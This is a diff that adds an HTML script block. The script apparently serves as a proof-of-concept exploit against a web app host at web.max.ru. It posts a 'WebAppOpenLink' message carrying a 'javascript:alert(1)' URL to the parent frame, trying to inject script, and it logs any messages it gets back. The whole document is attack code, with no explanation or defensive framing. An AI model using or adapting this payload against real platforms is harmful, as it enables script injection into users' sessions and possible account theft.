@@ -1,0 +1,13 @@
+<hr>
+<script>
+window.parent.postMessage(
+  JSON.stringify({
+      "type": "WebAppOpenLink",
+      "url": "javascript:alert(1)"
+  }),
+  "https://web.max.ru"
+);
+window.addEventListener("message", (event) => {
+  console.log("Полученные данные:", event.data);
+});
+</script>
